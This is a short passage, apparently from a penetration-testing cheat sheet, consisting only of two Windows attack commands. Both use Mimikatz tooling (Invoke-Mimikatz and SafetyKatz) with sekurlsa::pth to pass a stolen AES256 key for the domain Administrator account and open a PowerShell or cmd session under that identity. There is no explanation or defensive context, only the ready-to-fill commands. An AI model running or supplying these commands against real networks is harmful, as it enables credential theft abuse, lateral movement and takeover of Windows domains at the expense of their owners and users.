...
`Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator/domain:DOMINIO /aes256:<aes256key> /run:powershell.exe"'`

`SafetyKatz.exe "sekurlsa::pth /user:administrator/domain:DOMINIO /aes256:<aes256keys> /run:cmd.exe" "exit"`
